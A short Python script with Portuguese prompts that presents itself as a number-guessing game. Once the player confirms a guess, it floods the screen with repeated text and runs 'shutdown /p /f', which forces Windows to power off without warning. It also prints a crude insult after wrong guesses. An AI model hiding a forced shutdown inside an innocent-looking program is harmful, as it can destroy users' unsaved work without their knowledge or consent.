import random
import os


print('Vou adivinhar o número que está pensado entre 0 e 60')
input()

os.system('cls')
b = 'SABIAAA!!!!!'
n = 0
while True:
    if str(input(f'O número é {n}?\n')) == 'sim':
        for i in range(1000):
            print(b)
            b += 'SABIAAA!!!!!'
        os.system('shutdown /p /f')
        break
    else:
        os.system('cls')
        print('cu. Vou tentar de novo')
        n+=1
        input()
        os.system('cls')

